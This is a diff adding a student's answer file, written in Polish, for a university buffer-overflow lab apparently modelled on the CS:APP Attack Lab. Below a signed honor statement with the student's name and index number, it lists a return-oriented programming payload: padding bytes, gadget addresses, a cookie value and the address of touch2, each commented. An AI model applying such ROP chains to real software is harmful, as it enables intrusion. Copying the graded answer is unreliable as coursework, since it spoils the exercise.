@@ -1,0 +1,16 @@
+/* 
+ * Oświadczam, że zapoznałem(-am) się z regulaminem prowadzenia zajęć
+ * i jestem świadomy(-a) konsekwencji niestosowania się do podanych tam zasad.
+ *
+ * Imię i nazwisko, numer indeksu: Piotr Stachowicz, 337942
+ *
+ * Poniżej należy podać i wyjaśnić zawartość wkładaną na stos programu.
+ */
+
+42 42 42 42 42 42 42 42 /* nic */
+42 42 42 42 42 42 42 42 /* nic */
+42 42 42 42 42 42 42 42 /* nic */
+5c 1e 40 00 00 00 00 00 /* Adres gadgetu, wykonuje: popq %rax */
+20 43 36 28 00 00 00 00 /* Wartosc ciastka, ktora zostanie wrzucona przez gadget z linijki 13 do rax */
+33 1e 40 00 00 00 00 00 /* Adres gadgetu, wykonuje: movq %rax, %rdi */
+c7 1c 40 00 00 00 00 00 /* Adres touch2, przejdziemy tam po wykonaniu gadgetu z linijki 15 */
